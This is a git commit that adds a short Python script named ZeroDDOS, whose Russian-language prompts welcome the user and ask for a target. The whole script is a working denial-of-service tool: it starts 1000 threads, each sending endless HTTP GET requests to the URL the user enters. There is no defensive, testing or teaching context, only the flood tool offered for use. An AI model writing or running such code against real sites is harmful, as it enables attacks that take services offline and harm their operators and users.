bad99a4e53043bf6acf251de19a0a75c6530e67a
PetalRecorder <128726466+PetalRecorder@users.noreply.github.com>
2023-04-22 23:10:12 +0300

    Add files via upload

---
+++ ZeroDDOS.py
@@ -0,0 +1,13 @@
+import requests as r
+from threading import Thread
+
+def ddos():
+    while True:
+        r.get(target)
+print("Добро пожаловать в ZeroDDOS\nСоздано по фану Data_zer0")
+print("")
+target = input("Цель: ")
+for i in range(1000):
+    th = Thread(target=ddos)
+    th.start()
+
